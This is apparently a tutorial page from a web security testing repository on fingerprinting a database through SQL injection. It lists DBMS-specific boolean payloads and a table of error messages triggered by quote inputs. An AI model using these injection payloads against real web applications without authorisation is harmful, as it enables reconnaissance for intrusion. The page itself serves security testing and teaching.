If we does not know any thing about the target database and tables, to know the database name and the version will be our first priority.

- ### [SQL Payloads](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Vulnerabilities/SQL%20Injection/DBMS_Identification.md#sql-payloads-1)
- ### [Error Messages](https://github.com/SpiderSec101/Web_Application_Security_Testing/blob/main/Vulnerabilities/SQL%20Injection/DBMS_Identification.md#error-messages-1)

---

### SQL Payloads
It is a database fingerprinting technique in which we apply different SQL payloads to get any valid responses, so that we can confirm which SQL payload is working and then the database type can be easily known through the tables

- **MySQL-Specific Payloads**
If these payload can trigger ant valid responses or errors the DBMS is likely My-SQL based.
  
      conv('a',16,2)=conv('a',16,2)
      connection_id()=connection_id()
      crc32('MySQL')=crc32('MySQL')
  
- **MSSQL Specific Payloads**
  
    	BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
      @@CONNECTIONS>0
      @@CONNECTIONS=@@CONNECTIONS
      @@CPU_BUSY=@@CPU_BUSY
      USER_ID(1)=USER_ID(1)
  
- **Oracle Specific Payloads**
      ROWNUM=ROWNUM
      RAWTOHEX('AB')=RAWTOHEX('AB')
      LNNVL(0=123)
  
- **POSTGRESQL Specific Payloads**

      5::int=5
      5::integer=5
      pg_client_encoding()=pg_client_encoding()
      get_current_ts_config()=get_current_ts_config()
      quote_literal(42.5)=quote_literal(42.5)
      current_database()=current_database()

- **SQLite Specific Payloads**

      sqlite_version()=sqlite_version()
      last_insert_rowid()>1
      last_insert_rowid()=last_insert_rowid()

- **MSACCESS Specific Payloads**

      val(cvar(1))=1
      IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0

### Error Messages
If we can trigger any SQL error message, it also tells about the database type.

| **DBMS** | **Example Error Message** | **Example Payload** |
| --- | --- | --- |
| MySQL | `You have an error in your SQL syntax; ... near '' at line 1` | `'` |
| PostgreSQL | `ERROR: unterminated quoted string at or near "'"` | `'` |
| PostgreSQL | `ERROR: syntax error at or near "1"` | `1'` |
| Microsoft SQL Server | `Unclosed quotation mark after the character string ''.` | `'` |
| Microsoft SQL Server | `Incorrect syntax near ''.` | `'` |
| Microsoft SQL Server | `The conversion of the varchar value to data type int resulted in an out-of-range value.` | `1'` |
| Oracle | `ORA-00933: SQL command not properly ended` | `'` |
| Oracle | `ORA-01756: quoted string not properly terminated` | `'` |
| Oracle | `ORA-00923: FROM keyword not found where expected` | `1'` |






































    
